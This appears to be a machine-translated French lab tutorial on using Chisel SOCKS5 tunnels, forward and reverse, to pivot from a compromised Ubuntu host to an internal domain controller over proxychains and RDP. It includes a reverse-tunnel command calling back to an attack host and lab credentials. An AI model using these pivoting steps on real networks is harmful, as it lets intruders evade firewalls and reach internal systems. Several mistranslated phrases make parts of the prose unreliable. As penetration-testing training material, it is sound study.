Socks5 tunnels avec chisel
===========================

* * * * *

[Chisel] (https://github.com/jpillora/chisel) est un outil de tunneling basé sur TCP / UDP écrit dans [Go] (https://go.dev/) qui utilise HTTP pour transporter des données sécurisées en utilisant SSH. «Chisel» peut créer une connexion du tunnel client-serveur dans un environnement restreint du pare-feu. Considérons un scénario où nous devons tuer notre trafic vers un serveur Web sur le réseau `172.16.5.0` /` 23` (réseau interne). Nous avons le contrôleur de domaine avec l'adresse `172.16.5.19`. Ce n'est pas directement accessible à notre hôte d'attaque car notre hôte d'attaque et le contrôleur de domaine appartiennent à différents segments de réseau. Cependant, puisque nous avons compromis le serveur Ubuntu, nous pouvons démarrer un serveur Chisel dessus qui écoutera sur un port spécifique et transférer notre trafic vers le réseau interne via le tunnel établi.

Configuration et utilisation du ciseau
-------------------------

Avant de pouvoir utiliser Chisel, nous devons l'avoir sur notre hôte d'attaque. Si nous n'avons pas de ciselier sur notre hôte d'attaque, nous pouvons cloner le repo du projet en utilisant la commande directement ci-dessous:

#### Cloning Chisel

Ciseau de clonage

```
dsgsec@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

Nous aurons besoin du langage de programmation «GO» installé sur notre système pour construire le ciseau binaire. Avec GO installé sur le système, nous pouvons nous déplacer dans ce répertoire et utiliser «Go Build» pour construire le ciseau binaire.

#### Construire le burin binaire

Construire le ciseau binaire

```
dsgsec@htb[/htb]$ cd chisel
go build

```

Il peut être utile d'être conscient de la taille des fichiers que nous transférons sur des cibles sur les réseaux de notre client, non seulement pour des raisons de performances, mais aussi en considérant la détection. Deux ressources bénéfiques pour compléter ce concept particulier sont le billet de blog de l'OXDF "[tunneling avec Chisel et SSF] (https://0xdf.gitlab.io/2020/08/10/tunnel-with-chisel-and-ssf-pdate.html ) "Et la procédure pas à pas de la boîte d'Ippsec« rougeâtre ». IppSec commence son explication de Chisel, construisant le binaire et rétrécissant la taille du binaire à la marque 24:29 de sa [vidéo] (https://www.youtube.com/watch?v=yp4Oxoqibam&t=1469s).

Une fois le binaire construit, nous pouvons utiliser «SCP» pour le transférer à l'hôte pivot cible.

#### Transfert de bulleau binaire à Host Pivot

Transfert de ciselier binaire à Host Pivot

```
dsgsec@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    

```

Ensuite, nous pouvons démarrer le serveur / écouteur Chisel.

#### exécuter le serveur Chisel sur l'hôte pivot

Exécution du serveur Chisel sur l'hôte Pivot

```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

```

L'auditeur Chisel écoutera les connexions entrantes sur le port `1234` à l'aide de socks5 (` --socks5`) et le transfèrent à tous les réseaux accessibles à partir de l'hôte pivot. Dans notre cas, l'hôte Pivot a une interface sur le réseau 172.16.5.0/23, qui nous permettra d'atteindre les hôtes sur ce réseau.

Nous pouvons démarrer un client sur notre hôte d'attaque et nous connecter au serveur Chisel.

#### Connexion au serveur Chisel

Connexion au serveur Chisel

```
dsgsec@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected

```

Comme vous pouvez le voir dans la sortie ci-dessus, le client Chisel a créé un tunnel TCP / UDP via HTTP sécurisé à l'aide de SSH entre le serveur Chisel et le client et a commencé à écouter sur le port 1080. Nous pouvons désormais modifier notre fichier proxychains.conf situé sur `/ etc / proxychains.conf` et ajouter le port` 1080` à la fin afin que nous puissions utiliser ProxyChains pour pivoter en utilisant le tunnel créé entre le port 1080 et le tunnel SSH.

#### Édition et confirmation proxychains.conf

Nous pouvons utiliser n'importe quel éditeur de texte que nous aimerions modifier le fichier proxychains.conf, puis confirmer nos modifications de configuration à l'aide de «Tail».

Édition et confirmation proxychains.conf

```
dsgsec@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

```

Maintenant, si nous utilisons ProxyChains avec RDP, nous pouvons nous connecter au DC sur le réseau interne via le tunnel que nous avons créé pour l'hôte Pivot.

#### pivotant au DC

Pivotant au DC

```
dsgsec@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

* * * * *

Pivot inversé ciselier
--------------------

Dans l'exemple précédent, nous SED LA MACHINE COMPROMISÉ (UBUNTU) comme serveur Chisel, inscrivant sur le port 1234. Pourtant, il peut y avoir des scénarios où les règles de pare-feu restreignent les connexions entrantes à notre cible compromise. Dans de tels cas, nous pouvons utiliser le burin avec l'option inverse.

Lorsque le serveur Chisel a activé `` --reverse ', les télécommandes peuvent être préfixées avec `r` pour indiquer inversé. Le serveur écoutera et acceptera les connexions, et ils seront proxés via le client, qui a spécifié la télécommande. Remotes inverses spécifiant `R: Socks` écoutera le port de Socks par défaut du serveur (1080) et terminera la connexion au proxy SOCKS5 interne du client.

Nous démarrerons le serveur dans notre hôte d'attaque avec l'option `--reverse`.

#### Démarrage du serveur Chisel sur notre hôte d'attaque

Démarrage du serveur Chisel sur notre hôte d'attaque

```
dsgsec@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Ensuite, nous nous connectons à partir de l'Ubuntu (hôte pivot) à notre hôte d'attaque, en utilisant l'option `r: socks`

Démarrage du serveur Chisel sur notre hôte d'attaque

```
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

Nous pouvons utiliser n'importe quel éditeur que nous aimerions modifier le fichier proxychains.conf, puis confirmer nos modifications de configuration à l'aide de «Tail».

#### Édition et confirmation proxychains.conf

Édition et confirmation proxychains.conf

```
dsgsec@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

Si nous utilisons des proxychaines avec RDP, nous pouvons nous connecter au DC sur le réseau interne via le tunnel que nous avons créé pour l'hôte pivot.

Édition et confirmation proxychains.conf

```
dsgsec@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```